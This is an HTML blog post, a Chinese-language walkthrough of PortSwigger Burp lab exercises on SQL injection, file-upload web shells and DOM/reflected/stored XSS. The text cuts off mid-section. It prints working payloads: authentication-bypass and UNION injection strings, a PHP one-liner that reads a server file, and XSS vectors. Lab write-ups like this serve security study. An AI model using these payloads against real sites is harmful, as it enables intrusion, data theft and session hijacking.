@@ -1,0 +1,1013 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    burp靶场漏洞实战 | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https:&#x2F;&#x2F;0ade00b5041780e7808e120800720083.web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="burp靶场漏洞实战">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https:&#x2F;&#x2F;0ade00b5041780e7808e120800720083.web">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-03-31T14:06:57.000Z">
+<meta property="article:modified_time" content="2026-08-14T10:16:40.679Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="burp靶场">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="burp靶场漏洞实战">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">burp靶场漏洞实战</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98wp"><span class="toc-number">1.</span> <span class="toc-text"> burp靶场漏洞实战wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8Cwhere%E6%9D%A1%E6%AC%BE%E4%B8%AD%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AE%9E%E9%AA%8C%E5%85%81%E8%AE%B8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.实验：允许登录绕过的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%AE%9E%E9%AA%8Csql%E6%B3%A8%E5%85%A5union%E6%94%BB%E5%87%BB%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.实验：SQL注入UNION攻击，确定查询返回的列数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%80%9A%E8%BF%87%E7%BD%91%E9%A1%B5%E5%A3%B3%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.实验室：通过网页壳上传远程代码执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、跨站脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%B0%86xss%E6%98%A0%E5%B0%84%E5%88%B0html%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E4%B8%94%E6%B2%A1%E6%9C%89%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.实验：将XSS映射到HTML上下文中，且没有编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2dom-xss-%E5%9C%A8-sack-%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%BA%90%E4%BB%A3%E7%A0%81documentwritelocationsearch"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.DOM XSS 在 sack 中使用源代码document.write&#96;&#96;location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3dom-xss-in-innerhtml-sink-using-source-locationsearch"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4dom-xss-in-jquery-anchor-attribute-sink-using-sourcehreflocationsearch"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.DOM XSS in jQuery anchor attribute sink using sourcehref&#96;&#96;location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-reflected-xss-into-html-context-with-nothing-encoded"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5. Reflected XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6stored-xss-into-html-context-with-nothing-encoded"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 6.Stored XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7dom-xss-in-jquery-selector-sink-using-a-hashchange-event"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 7.DOM XSS in jQuery selector sink using a hashchange event</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-reflected-xss-into-attribute-with-angle-brackets-html-encoded"><span class="toc-number">1.3.8.</span> <span class="toc-text"> 8. Reflected XSS into attribute with angle brackets HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9stored-xss-into-anchor-attribute-with-double-quotes-html-encodedhref"><span class="toc-number">1.3.9.</span> <span class="toc-text"> 9.Stored XSS into anchor attribute with double quotes HTML-encodedhref</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded"><span class="toc-number">1.3.10.</span> <span class="toc-text"> 10.Reflected XSS into a JavaScript string with angle brackets HTML encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded"><span class="toc-number">1.3.11.</span> <span class="toc-text"> 11.DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12reflected-dom-xss"><span class="toc-number">1.3.12.</span> <span class="toc-text"> 12.Reflected DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13reflected-xss-into-html-context-with-most-tags-and-attributes-blocked"><span class="toc-number">1.3.13.</span> <span class="toc-text"> 13.Reflected XSS into HTML context with most tags and attributes blocked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones"><span class="toc-number">1.3.14.</span> <span class="toc-text"> 14.Reflected XSS into HTML context with all tags blocked except custom ones</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15reflected-xss-with-some-svg-markup-allowed"><span class="toc-number">1.3.15.</span> <span class="toc-text"> 15.Reflected XSS with some SVG markup allowed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16reflected-xss-in-canonical-link-tag"><span class="toc-number">1.3.16.</span> <span class="toc-text"> 16.Reflected XSS in canonical link tag</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-burp靶场漏洞实战" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-03-31T14:06:57.000Z" itemprop="datePublished">2026-03-31</time>
+    <time style="display: none;" id="post-update-time">2026-08-14</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="burp靶场漏洞实战wp"><a class="markdownIt-Anchor" href="#burp靶场漏洞实战wp"></a> burp靶场漏洞实战wp</h1>
+<p>之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度</p>
+<h2 id="一-sql注入"><a class="markdownIt-Anchor" href="#一-sql注入"></a> 一、sql注入</h2>
+<h3 id="1实验where条款中允许检索隐藏数据的sql注入漏洞"><a class="markdownIt-Anchor" href="#1实验where条款中允许检索隐藏数据的sql注入漏洞"></a> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</h3>
+<p>开头一个个看过去，没什么特别的。仔细看发现在<strong>Refine your search:</strong></p>
+<p>下面点进去url会变为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=Tech+gifts</span><br></pre></td></tr></table></figure>
+<p>看起来存在SQL注入。</p>
+<p>改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=1&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>
+<p>直接过了emmmmmm</p>
+<h3 id="2实验允许登录绕过的sql注入漏洞"><a class="markdownIt-Anchor" href="#2实验允许登录绕过的sql注入漏洞"></a> 2.实验：允许登录绕过的SQL注入漏洞</h3>
+<p>题目描述：该实验室的登录功能中存在SQL注入漏洞。</p>
+<p>要解决实验室问题，可以执行SQL注入攻击，以用户身份登录应用。<code>administrator</code></p>
+<p>直接万能语句1’ or 1=1–+ 秒了</p>
+<h3 id="3实验sql注入union攻击确定查询返回的列数"><a class="markdownIt-Anchor" href="#3实验sql注入union攻击确定查询返回的列数"></a> 3.实验：SQL注入UNION攻击，确定查询返回的列数</h3>
+<p>题目看出来是联合注入，</p>
+<p>这里已经很熟悉了，直接非常顺利</p>
+<p>1’ order by 3–+通过</p>
+<p>1’ order by 4–+报错，知道三列</p>
+<p>于是写payload，这里有一个问题当时错了：</p>
+<p>我最开始写的payload是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a9000cf04defb8b808a26d400ac0024.web-security-academy.net/filter?category=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<p>页面报错，当时不知道为什么啊，后来查阅资料才知道：因为 <code>UNION</code> 要求类型兼容。如果第一列是整数，你输入 <code>'1'</code> 可能会报错；而 <code>NULL</code> 可以自适应任何类型。所以这里用1,2,3是错误的QAQ</p>
+<p>修改payload得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a9000cf04defb8b808a26d400ac0024.web-security-academy.net/filter?category=-1&#x27; union select NULL ,NULL ,NULL--+</span><br></pre></td></tr></table></figure>
+<p>通过</p>
+<h2 id="二-文件上传漏洞"><a class="markdownIt-Anchor" href="#二-文件上传漏洞"></a> 二、文件上传漏洞</h2>
+<h3 id="1实验室通过网页壳上传远程代码执行"><a class="markdownIt-Anchor" href="#1实验室通过网页壳上传远程代码执行"></a> 1.实验室：通过网页壳上传远程代码执行</h3>
+<p>题目描述：</p>
+<p>该实验室包含一个易受攻击的图像上传功能。它不会在用户上传的文件存储到服务器文件系统前进行任何验证。</p>
+<p>要解决实验问题，上传一个基础的PHP网页壳，并用它导出文件内容。请通过实验室横幅中的按钮提交此秘密。<code>/home/carlos/secret</code></p>
+<p>您可以使用以下凭证登录您自己的账户：<code>wiener:peter</code></p>
+<p>ps：骗你的，刚开始我甚至不知道这是题目描述（）</p>
+<p>打开来就开始找上传点，然后在评论区找到了上传头像的位置，出于以往经验，我直接尝试上传，却得到missing parameter，多次尝试无果后我转变方向，发现没有login（），这才知道wiener:peter原来是题目里的（）气笑了说是</p>
+<p>题目提示：如果你能成功上传网页外壳，你实际上就完全控制了服务器。这意味着你可以读写任意文件，窃取敏感数据，甚至利用服务器来针对内部基础设施和网络外其他服务器发动攻击。例如，以下PHP一行代码可用于从服务器文件系统读取任意文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&#x27;/path/to/target/file&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>上传后，发送对该恶意文件的请求将在响应中返回目标文件的内容。</p>
+<p>然后就写一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>上传成功后，查看上传路径，木马便会自动执行，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /files/avatars/1.php HTTP/2</span><br></pre></td></tr></table></figure>
+<p>得到目标：</p>
+<p>Rnh4NwyW1Gl2Ko3yWlVT2eFgyKRH9Hcd</p>
+<h2 id="三-跨站脚本"><a class="markdownIt-Anchor" href="#三-跨站脚本"></a> 三、跨站脚本</h2>
+<h3 id="1实验将xss映射到html上下文中且没有编码"><a class="markdownIt-Anchor" href="#1实验将xss映射到html上下文中且没有编码"></a> 1.实验：将XSS映射到HTML上下文中，且没有编码</h3>
+<p>最简单的xss，</p>
+<p>直接<code>&lt;script&gt;alert()&lt;/script&gt;</code>就行。</p>
+<h3 id="2dom-xss-在-sack-中使用源代码documentwritelocationsearch"><a class="markdownIt-Anchor" href="#2dom-xss-在-sack-中使用源代码documentwritelocationsearch"></a> 2.DOM XSS 在 sack 中使用源代码<code>document.write``location.search</code></h3>
+<p>理解DOM漏洞原理</p>
+<ul>
+<li><strong>源 (Source)</strong>：<code>location.search</code>，这是浏览器地址栏中 <code>?</code> 后面的部分（也就是 GET 参数）。攻击者可以完全控制这部分。</li>
+<li><strong>汇 (Sink)</strong>：<code>document.write</code>。这个函数会将传入的字符串直接解析为 HTML 写入页面。如果传入的数据包含 <code>&lt;script&gt;</code> 标签，它<strong>通常不会执行</strong>（这是很多人的误区）。</li>
+<li><strong>关键点</strong>：在 <code>document.write</code> 的上下文中，最可靠的 XSS 触发方式不是 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，而是<strong>HTML 事件处理器</strong>，例如 <code>&lt;img src=x onerror=alert(1)&gt;</code>。</li>
+</ul>
+<p>DOM型xss最常见的来源是url,故我们可以尝试一下，在搜索栏里随便输入发现url变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a360098047f989f80da125100e00067.web-security-academy.net/?search=1</span><br></pre></td></tr></table></figure>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=alert(666)&gt;</span><br><span class="line">这里注意闭合前面的&lt;&quot;</span><br><span class="line">&quot;&gt;&lt;svg onload=alert(666)&gt;</span><br></pre></td></tr></table></figure>
+<p>其实本实验的核心还是在于闭合前面语句上面。</p>
+<h3 id="3dom-xss-in-innerhtml-sink-using-source-locationsearch"><a class="markdownIt-Anchor" href="#3dom-xss-in-innerhtml-sink-using-source-locationsearch"></a> 3.DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h3>
+<p>比2还简单,直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert()&gt;</span><br></pre></td></tr></table></figure>
+<p>即可。</p>
+<p>这里简单说说原理，</p>
+<ul>
+<li><strong><code>&lt;img</code></strong>：这是一个标准的 HTML 图片标签的开始。浏览器看到它，就会准备去加载一张图片。</li>
+<li><strong><code>src=x</code></strong>：这是图片的源地址属性。我们故意给它一个<strong>不存在的、无效的</strong>地址 <code>x</code>。</li>
+<li><strong><code>onerror=alert(1)</code></strong>：这是一个<strong>事件处理器</strong>。<code>onerror</code> 是 <code>&lt;img&gt;</code> 标签的一个内置事件，它的触发条件是：<strong>当浏览器加载 <code>src</code> 指定的图片资源失败时</strong>。</li>
+</ul>
+<p>因此会触发xss</p>
+<h3 id="4dom-xss-in-jquery-anchor-attribute-sink-using-sourcehreflocationsearch"><a class="markdownIt-Anchor" href="#4dom-xss-in-jquery-anchor-attribute-sink-using-sourcehreflocationsearch"></a> 4.DOM XSS in jQuery anchor attribute sink using source<code>href``location.search</code></h3>
+<p>漏洞的根本原理：</p>
+<ol>
+<li>源（Source）：<code>location.search</code></li>
+</ol>
+<p><code>location.search</code> 是浏览器JavaScript中的一个属性，它返回URL中<code>?</code>后面的所有内容（包括问号本身）。</p>
+<p>eg.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/page?name=john&amp;age=25</span><br></pre></td></tr></table></figure>
+<p><code>location.search</code> 的值是：<code>?name=john&amp;age=25</code></p>
+<p>攻击者可以完全控制这部分内容，因为它是用户输入的。</p>
+<ol start="2">
+<li>接收器（Sink）：jQuery的<code>attr('href', ...)</code></li>
+</ol>
+<p>jQuery的<code>attr()</code>函数用于设置HTML元素的属性。当它被用来设置<code>&lt;a&gt;</code>标签的<code>href</code>属性时，就构成了一个危险的接收器。</p>
+<p>关键问题在于：<strong>jQuery在处理<code>href</code>属性时，不会对<code>javascript:</code>协议进行任何过滤或净化</strong>。</p>
+<p>找到页面点击反馈界面改一下即可</p>
+<p>就这样就解决了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a5b00e103d9d5a4801b4fa9007100c3.web-security-academy.net/feedback?returnPath=javascript:alert()</span><br></pre></td></tr></table></figure>
+<h3 id="5-reflected-xss-into-html-context-with-nothing-encoded"><a class="markdownIt-Anchor" href="#5-reflected-xss-into-html-context-with-nothing-encoded"></a> 5. Reflected XSS into HTML context with nothing encoded</h3>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>即可</p>
+<h3 id="6stored-xss-into-html-context-with-nothing-encoded"><a class="markdownIt-Anchor" href="#6stored-xss-into-html-context-with-nothing-encoded"></a> 6.Stored XSS into HTML context with nothing encoded</h3>
+<p>payload和5一样，留言放评论区就行。</p>
+<h3 id="7dom-xss-in-jquery-selector-sink-using-a-hashchange-event"><a class="markdownIt-Anchor" href="#7dom-xss-in-jquery-selector-sink-using-a-hashchange-event"></a> 7.DOM XSS in jQuery selector sink using a hashchange event</h3>
+<ol>
+<li>源（Source）：<code>location.hash</code></li>
+</ol>
+<p><code>location.hash</code> 返回URL中<code>#</code>后面的内容（包括<code>#</code>号本身）。</p>
+<p>eg.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/page#section2</span><br></pre></td></tr></table></figure>
+<p><code>location.hash</code> 的值是：<code>#section2</code></p>
+<p>因此，与4不同的是存在#</p>
+<p>#javascript:alert(1)  没有<code>&lt;&gt;</code>，触发变为查找ID为<code>javascript:alert(1)</code>的元素，无法触发xss</p>
+<ol start="2">
+<li>接收器（Sink）：jQuery选择器</li>
+</ol>
+<p>jQuery选择器是jQuery的核心功能，用于选择DOM元素：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;selector&#x27;</span>)  <span class="comment">// 或 jQuery(&#x27;selector&#x27;)</span></span><br></pre></td></tr></table></figure>
+<p>问题在于，如果选择器的内容来自用户输入，攻击者可以注入特殊字符来执行任意JavaScript。</p>
+<p>因此，payload变为：</p>
